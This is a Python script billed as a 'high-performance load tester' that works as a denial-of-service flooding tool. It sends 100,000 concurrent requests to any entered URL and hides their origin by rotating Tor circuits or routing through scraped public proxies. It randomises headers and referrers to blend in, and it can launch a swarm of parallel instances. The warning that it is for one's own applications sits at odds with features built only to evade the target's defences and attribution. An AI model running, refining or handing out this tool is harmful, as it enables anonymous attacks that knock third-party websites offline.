#!/usr/bin/env python3
"""
Tor-Routed HTTP Load Testing Script
WARNING: For testing YOUR OWN applications only
"""
import requests
import time
import random
import subprocess
import threading
from collections import defaultdict
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Optional
from stem import Signal
from stem.control import Controller
import queue
import json
import os

STATS_DIR = "/tmp/bot_stats"
BOT_ID = f"bot_{os.getpid()}"

# Ensure the stats directory exists
os.makedirs(STATS_DIR, exist_ok=True)

# Tor configuration
TOR_PROXY_HOST = "127.0.0.1"
TOR_PROXY_PORT = 9050
TOR_CONTROL_PORT = 9051
TOR_PASSWORD = ""

# Large pool of realistic user agents (latest versions, diverse platforms)
USER_AGENTS = [
    # Firefox on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    # Firefox on macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0; rv:120.0) Gecko/20100101 Firefox/120.0",
    # Firefox on Linux
    "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    # Chrome on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    # Chrome on macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    # Chrome on Linux
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    # Safari on macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    # Edge on Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
]

ACCEPT_LANGUAGES = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "en-CA,en;q=0.9",
    "en-AU,en;q=0.9",
    "de-DE,de;q=0.9,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8",
    "it-IT,it;q=0.9,en;q=0.8",
    "pt-BR,pt;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8",
]

# Realistic referrers to blend in
REFERRERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://www.yahoo.com/",
    "",  # Direct navigation
]

# Sources for scraping public proxies
PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
]

# Global queue for holding proxies
PROXY_LIST = queue.Queue()

def ensure_tor_running():
    """Ensure Tor service is running"""
    try:
        result = subprocess.run(['pgrep', '-x', 'tor'], capture_output=True)
        if result.returncode != 0:
            print("⚠️  Tor is not running. Starting Tor...")
            subprocess.run(['sudo', 'pkill', '-9', 'tor'], stderr=subprocess.DEVNULL)
            time.sleep(1)
            subprocess.Popen(['sudo', 'tor'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("⏳ Waiting for Tor to start...")
            time.sleep(5)
            result = subprocess.run(['pgrep', '-x', 'tor'], capture_output=True)
            if result.returncode == 0:
                print("✅ Tor started successfully")
                return True
            else:
                print("❌ Failed to start Tor")
                return False
        return True
    except Exception as e:
        print(f"⚠️  Could not check/start Tor: {e}")
        return True

def renew_tor_circuit():
    """Request new Tor circuit to change IP"""
    try:
        with Controller.from_port(port=TOR_CONTROL_PORT) as controller:
            controller.authenticate(password=TOR_PASSWORD)
            controller.signal(Signal.NEWNYM)
            time.sleep(0.5)  # Reduced delay for faster IP rotation
            return True
    except Exception as e:
        return False

def fetch_proxies():
    """Scrape proxies from multiple sources in parallel."""
    print("🔄 Scraping for fresh public proxies...")
    proxies = set()
    
    def scrape(url):
        try:
            response = requests.get(url, timeout=15)
            if response.status_code == 200:
                return response.text.strip().split('\n')
        except Exception:
            return None
        return None

    with ThreadPoolExecutor(max_workers=len(PROXY_SOURCES)) as executor:
        future_to_url = {executor.submit(scrape, url): url for url in PROXY_SOURCES}
        for future in as_completed(future_to_url):
            result = future.result()
            if result:
                for proxy in result:
                    if ':' in proxy:
                        proxies.add(proxy.strip())

    if not proxies:
        print("❌ Could not fetch any public proxies. Please check your internet connection.")
        return []

    proxy_list = list(proxies)
    random.shuffle(proxy_list)
    print(f"✅ Found {len(proxy_list):,} unique public proxies.")
    return proxy_list

def validate_proxies(proxies_to_test: list, timeout: int = 5) -> list:
    """
    Tests a list of proxies in parallel to see if they are live.
    Returns a list of working proxies.
    """
    print(f"🔬 Validating {len(proxies_to_test):,} scraped proxies... (this may take a moment)")
    live_proxies = []
    
    # Use a more lenient target for validation
    validation_url = "http://httpbin.org/ip"

    def check_proxy(proxy):
        try:
            response = requests.get(
                validation_url,
                headers={'User-Agent': random.choice(USER_AGENTS)},
                proxies={'http': f'http://{proxy}', 'https': f'http://{proxy}'},
                timeout=timeout
            )
            if response.status_code == 200:
                return proxy
        except Exception:
            return None
        return None

    with ThreadPoolExecutor(max_workers=300) as executor: # Increased concurrency for faster checking
        future_to_proxy = {executor.submit(check_proxy, proxy): proxy for proxy in proxies_to_test}
        
        for i, future in enumerate(as_completed(future_to_proxy)):
            result = future.result()
            if result:
                live_proxies.append(result)
            
            # Progress indicator
            progress = (i + 1) / len(proxies_to_test) * 100
            print(f"\r   -> Progress: {progress:3.0f}% | Live Proxies Found: {len(live_proxies)}", end="", flush=True)

    print() # Newline after progress bar
    if live_proxies:
        print(f"✅ Validation complete. Found {len(live_proxies)} working proxies.")
    else:
        print("❌ No working proxies found from the scraped list.")
        
    return live_proxies

def get_random_headers():
    """Generate randomized HTTP headers for better anonymity"""
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': random.choice(ACCEPT_LANGUAGES),
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': random.choice(['none', 'same-origin', 'cross-site']),
        'Cache-Control': random.choice(['max-age=0', 'no-cache']),
    }
    
    # Randomly add referer (60% chance)
    if random.random() < 0.6:
        referrer = random.choice(REFERRERS)
        if referrer:
            headers['Referer'] = referrer
    
    # Randomly vary some headers for more diversity
    if random.random() < 0.3:
        headers['Pragma'] = 'no-cache'
    
    return headers

def make_request(url: str, method: str = "GET", timeout: int = 10, mode: str = "tor", request_num: int = 0, rotate_every: int = 10, session: Optional[requests.Session] = None) -> dict:
    """Make a single HTTP request with randomized headers using the specified mode."""
    start_time = time.time()
    proxy = None
    
    # --- Mode-specific logic ---
    if mode == "tor":
        # Rotate Tor IP every N requests
        if request_num > 0 and request_num % rotate_every == 0:
            try:
                renew_tor_circuit()
                time.sleep(0.3)
            except:
                pass # Continue even if renewal fails
    elif mode == "proxy":
        # Get a proxy from the queue for this request
        try:
            proxy = PROXY_LIST.get(timeout=1)
        except queue.Empty:
            return {"success": False, "error": "Proxy queue empty", "elapsed": 0, "size": 0, "timestamp": time.time(), "status_code": 0}
    
    try:
        # Create a fresh session for each request to avoid connection issues
        if session is None or mode in ["proxy", "direct"]:
            session = requests.session()

        # Set proxies based on mode
        if mode == "tor":
            session.proxies = {
                'http': f'socks5h://{TOR_PROXY_HOST}:{TOR_PROXY_PORT}',
                'https': f'socks5h://{TOR_PROXY_HOST}:{TOR_PROXY_PORT}'
            }
        elif mode == "proxy":
            session.proxies = {
                'http': f'http://{proxy}',
                'https': f'http://{proxy}'
            }
        else: # Direct connection
            session.proxies = None

        headers = get_random_headers()
        
        # Adjust timeout based on mode
        if mode == "proxy":
            actual_timeout = 8
        elif mode == "tor":
            actual_timeout = 30  # Tor needs more time
        else:
            actual_timeout = timeout
        
        if method.upper() == "GET":
            response = session.get(url, headers=headers, timeout=actual_timeout, allow_redirects=True)
        elif method.upper() == "POST":
            response = session.post(url, headers=headers, timeout=actual_timeout, allow_redirects=True)
        else:
            raise ValueError(f"Unsupported method: {method}")
        
        elapsed = time.time() - start_time
        response_size = len(response.content) if hasattr(response, 'content') else 0
        
        # If the request was successful, put the proxy back in the queue for reuse
        if mode == "proxy" and proxy:
            PROXY_LIST.put(proxy)

        return {
            "success": True,
            "status_code": response.status_code,
            "elapsed": elapsed,
            "size": response_size,
            "timestamp": time.time(),
            "error": None
        }
    except (requests.exceptions.ProxyError, requests.exceptions.ConnectTimeout, requests.exceptions.ReadTimeout, requests.exceptions.ConnectionError) as e:
        # If a proxy fails, we don't put it back in the queue. It's discarded.
        elapsed = time.time() - start_time
        error_type = type(e).__name__
        error_msg = f"{error_type}"
        
        return {
            "success": False, "error": error_msg, "elapsed": elapsed,
            "size": 0, "timestamp": time.time(), "status_code": 0
        }
    except Exception as e:
        # Also discard failing proxies on other errors
        elapsed = time.time() - start_time
        return {
            "success": False, "error": f"{type(e).__name__}", "elapsed": elapsed,
            "size": 0, "timestamp": time.time(), "status_code": 0
        }
    finally:
        # Close session for proxy/direct mode to free resources
        if mode in ["proxy", "direct"] and session:
            try:
                session.close()
            except:
                pass

def run_load_test(url: str, num_requests: int, concurrency: int = 10, method: str = "GET", rotate_every: int = 10, mode: str = "tor"):
    """Run load test with specified parameters using the chosen mode."""
    
    anonymity_level = "NONE"
    if mode == "tor":
        print("🔍 Checking Tor status...")
        if not ensure_tor_running():
            print("❌ Tor could not be started. Aborting.")
            return
        anonymity_level = "High (Tor)"
    elif mode == "proxy":
        proxies = fetch_proxies()
        if not proxies:
            print("❌ Could not fetch proxies. Aborting.")
            return
        
        # Validate the scraped proxies before using them
        live_proxies = validate_proxies(proxies)
        if not live_proxies:
            print("❌ No working proxies found after validation. Aborting.")
            return

        for p in live_proxies:
            PROXY_LIST.put(p)
        anonymity_level = f"Good ({len(live_proxies):,} Live Proxies)"
    elif mode == "direct":
        anonymity_level = "⚠️ NONE (Real IP)"

    print(f"\nStarting load test:")
    print(f"  URL: {url}")
    print(f"  Mode: {mode.upper()}")
    print(f"  Anonymity: {anonymity_level}")
    print(f"  Requests: {num_requests:,}")
    print(f"  Concurrency: {concurrency} threads")
    print()
    
    results = {
        "total": 0, "success": 0, "failed": 0, "response_times": [],
        "status_codes": defaultdict(int), "error_types": defaultdict(int),
        "bytes_received": 0
    }
    results_lock = threading.Lock()
    start_time = time.time()
    
    # Create session pool based on mode
    sessions = []
    if mode == "tor":
        # Limit Tor sessions to avoid overwhelming the Tor network
        pool_size = min(concurrency, 10)  # Max 10 concurrent Tor sessions
        for _ in range(pool_size):
            s = requests.session()
            s.proxies = {
                'http': f'socks5h://{TOR_PROXY_HOST}:{TOR_PROXY_PORT}',
                'https': f'socks5h://{TOR_PROXY_HOST}:{TOR_PROXY_PORT}'
            }
            sessions.append(s)
    else:
        # For proxy/direct mode, don't reuse sessions
        sessions = [None]

    with ThreadPoolExecutor(max_workers=concurrency) as executor:
        futures = [
            executor.submit(make_request, url, method, 15, mode, i, rotate_every, sessions[i % len(sessions)] if mode == "tor" else None) 
            for i in range(num_requests)
        ]
        
        print(f"⚡ Real-time monitoring started...")
        print(f"{'Time':<8} {'Completed':<12} {'Success':<10} {'Failed':<10} {'Rate/s':<10} {'Avg RT':<10} {'Status':<20}")
        print("-"*90)
        
        completed_count = 0
        last_update = time.time()
        
        for i, future in enumerate(as_completed(futures), 1):
            result = future.result()
            
            with results_lock:
                results["total"] += 1
                if result["success"]:
                    results["success"] += 1
                    results["status_codes"][result.get("status_code", 0)] += 1
                    results["bytes_received"] += result.get("size", 0)
                else:
                    results["failed"] += 1
                    error = result.get("error", "Unknown")
                    error_type = error.split(":")[0]
                    results["error_types"][error_type] += 1
                
                if result["elapsed"] > 0:
                    results["response_times"].append(result["elapsed"])
            
            completed_count += 1
            current_time = time.time()
            
            if current_time - last_update >= 0.5 or i == num_requests:
                elapsed = current_time - start_time
                rate = completed_count / elapsed if elapsed > 0 else 0
                avg_time = sum(results["response_times"]) / len(results["response_times"]) if results["response_times"] else 0
                
                if results["status_codes"]:
                    top_status = max(results["status_codes"].items(), key=lambda x: x[1])
                    status_display = f"{top_status[0]}({top_status[1]})"
                elif results["error_types"]:
                    top_error = max(results["error_types"].items(), key=lambda x: x[1])
                    status_display = f"ERR:{top_error[0][:12]}"
                else:
                    status_display = "N/A"
                
                time_str = f"{int(elapsed)}s"
                completed_str = f"{completed_count:,}/{num_requests:,}"
                success_str = f"{results['success']:,}"
                failed_str = f"{results['failed']:,}"
                rate_str = f"{rate:.1f}"
                avg_rt_str = f"{avg_time*1000:.0f}ms"
                
                print(f"\r{time_str:<8} {completed_str:<12} {success_str:<10} {failed_str:<10} {rate_str:<10} {avg_rt_str:<10} {status_display:<20}", end="", flush=True)
                last_update = current_time

                # --- Write stats to file for the dashboard ---
                try:
                    stats_data = {
                        "timestamp": time.time(),
                        "completed": completed_count,
                        "success": results["success"],
                        "failed": results["failed"],
                        "rate": rate,
                        "status_codes": results["status_codes"],
                        "error_types": results["error_types"],
                    }
                    with open(os.path.join(STATS_DIR, f"{BOT_ID}.json"), 'w') as f:
                        json.dump(stats_data, f)
                except Exception:
                    # Don't let stats writing crash the bot
                    pass
    
    total_time = time.time() - start_time
    print("\n") # Newline after progress bar finishes

    # --- Summary Report ---
    print("\n" + "="*80)
    print("📊 LOAD TEST SUMMARY")
    print("="*80)
    
    print(f"\n🎯 REQUESTS:")
    print(f"  Total:     {results['total']:,}")
    print(f"  ✅ Success:   {results['success']:,} ({results['success']/results['total']*100:.1f}%)")
    print(f"  ❌ Failed:    {results['failed']:,} ({results['failed']/results['total']*100:.1f}%)")
    
    if results["response_times"]:
        avg_time = sum(results["response_times"]) / len(results["response_times"])
        print(f"\n⏲️  PERFORMANCE:")
        print(f"  Total Duration: {total_time:.2f}s")
        print(f"  Average Rate:   {results['total']/total_time:.2f} req/s")
        print(f"  Average RT:     {avg_time*1000:.2f}ms")

    if results["status_codes"]:
        print(f"\n📋 STATUS CODES:")
        for code, count in sorted(results["status_codes"].items()):
            print(f"  {code}: {count:,}")

    if results["error_types"]:
        print(f"\n❌ ERROR TYPES:")
        for error, count in sorted(results["error_types"].items()):
            print(f"  {error}: {count:,}")

    print("\n" + "="*80)

import sys
import argparse

def main():
    parser = argparse.ArgumentParser(
        description="BOOM - High-Performance Load Tester",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument('url', nargs='?', default=None, help='Target URL')
    parser.add_argument('-n', '--requests', type=int, default=100000, help='Number of requests')
    parser.add_argument('-c', '--concurrency', type=int, default=50, help='Concurrent requests')
    parser.add_argument('-m', '--method', type=str, default='GET', help='HTTP method (GET/POST)')
    parser.add_argument('--mode', type=str, default=None, choices=['tor', 'proxy', 'direct'], help='Anonymity mode')
    parser.add_argument('--no-prompt', action='store_true', help='Skip interactive prompts')

    args = parser.parse_args()

    if args.no_prompt and not args.url:
        print("❌ URL must be provided as the first argument when running with --no-prompt.")
        sys.exit(1)

    print("=" * 60)
    print("💥 BOOM - High-Performance Load Tester")
    print("=" * 60)

    if not args.no_prompt:
        url = input(f"\n🔗 Enter target URL: ").strip()
        if not url:
            print("❌ No URL provided. Exiting.")
            return
        
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url

        while True:
            print("\nChoose Anonymity Mode:")
            print("  1. Tor      (Highest Anonymity, Low Speed)")
            print("  2. Proxies  (Good Anonymity, High Speed)")
            print("  3. Direct   (No Anonymity, Max Speed) ⚠️ Your REAL IP will be used.")
            mode_choice = input("Choice (1/2/3): ").strip()
            if mode_choice == '1':
                mode = 'tor'
                break
            elif mode_choice == '2':
                mode = 'proxy'
                break
            elif mode_choice == '3':
                mode = 'direct'
                break
            else:
                print("Invalid choice. Please enter 1, 2, or 3.")
        
        # Ask if user wants to spawn multiple terminals
        while True:
            spawn_choice = input("\n🚀 Do you want to spawn multiple terminals/instances? (y/n): ").strip().lower()
            if spawn_choice in ['y', 'yes']:
                while True:
                    num_terminals = input("🤖 How many terminals do you want to spawn? (e.g., 5): ").strip()
                    try:
                        num_terminals = int(num_terminals)
                        if num_terminals > 0:
                            # Launch start_swarm.sh with the collected parameters
                            print(f"\n🔄 Launching {num_terminals} instances using start_swarm.sh...")
                            print(f"   URL: {url}")
                            print(f"   Mode: {mode}")
                            
                            # Call start_swarm.sh via subprocess
                            import os
                            script_dir = os.path.dirname(os.path.abspath(__file__))
                            swarm_script = os.path.join(script_dir, "start_swarm.sh")
                            
                            # Create a temporary input for the script
                            mode_map = {'tor': '1', 'proxy': '2', 'direct': '3'}
                            input_data = f"{url}\n{num_terminals}\n{mode_map[mode]}\n"
                            
                            result = subprocess.run(['bash', swarm_script], 
                                                  input=input_data, 
                                                  text=True,
                                                  cwd=script_dir)
                            
                            if result.returncode == 0:
                                print("\n✅ Swarm launched successfully!")
                            else:
                                print("\n❌ Failed to launch swarm.")
                            return
                        else:
                            print("❌ Please enter a positive number.")
                    except ValueError:
                        print("❌ Invalid input. Please enter a number.")
                break
            elif spawn_choice in ['n', 'no']:
                break
            else:
                print("Invalid choice. Please enter 'y' or 'n'.")
        
        num_requests, concurrency, method = args.requests, args.concurrency, args.method
        print(f"\n🚀 Starting test with default settings:")
        print(f"   - Requests: {num_requests:,}")
        print(f"   - Concurrency: {concurrency}")

    else:
        url = args.url
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        num_requests, concurrency, method, mode = \
            args.requests, args.concurrency, args.method, args.mode
        if not mode:
            mode = 'proxy' # Default to proxy mode for watchdog
        print(f"🤖 Watchdog mode detected. Running non-interactively in '{mode}' mode.")

    print("\n" + "=" * 60)
    
    try:
        print(f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Starting test cycle...")
        run_load_test(url, num_requests, concurrency, method, 50, mode) # rotate_every is for Tor only
        print(f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Test cycle finished.")
    except KeyboardInterrupt:
        print("\n🛑 Script interrupted by user (Ctrl+C). Exiting.")
    except Exception as e:
        print("\n" + "="*80)
        print(f"❌ An unexpected error occurred: {e}")
        print("="*80)
    finally:
        # --- Cleanup stats file on exit ---
        try:
            stats_file = os.path.join(STATS_DIR, f"{BOT_ID}.json")
            if os.path.exists(stats_file):
                os.remove(stats_file)
        except Exception:
            pass

if __name__ == "__main__":
    main()
